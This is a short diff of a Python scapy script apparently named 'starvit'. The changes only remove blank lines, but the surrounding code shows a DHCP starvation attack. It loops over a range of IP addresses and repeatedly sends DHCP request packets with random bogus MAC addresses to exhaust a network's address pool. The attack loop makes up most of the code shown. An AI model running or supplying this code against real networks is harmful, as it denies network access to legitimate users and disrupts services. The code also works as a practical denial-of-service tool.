@@ -35,11 +35,9 @@ def starvit(net="192.168.1.0/24",
             debug=0):
     # Stops scapy from checking return packet originating from any packet that we have sent out
     #conf.checkIPaddr = False 
-    
     addresses = get_addresses(net=net,
                               start_ip=start_ip,
                               end_ip=end_ip)
-    
     for ip in addresses:
         bogus_mac_address = RandMAC()
         dhcp_options = [("message-type","request"),
@@ -58,7 +56,6 @@ def starvit(net="192.168.1.0/24",
                            /UDP(sport=68, dport=67)\
                            /BOOTP(chaddr=bogus_mac_address)\
                            /DHCP(options=dhcp_options)
-        
         print("Requesting: " + ip)
         for i in range(repetition):
             sendp(dhcp_request)
@@ -113,7 +110,6 @@ if __name__=="__main__":
     
     # needed in presence of ovpn/tun/tap interfaces
     conf.iface = args.i
-    
     # run!
     starvit(net=args.net,
             start_ip=args.start,
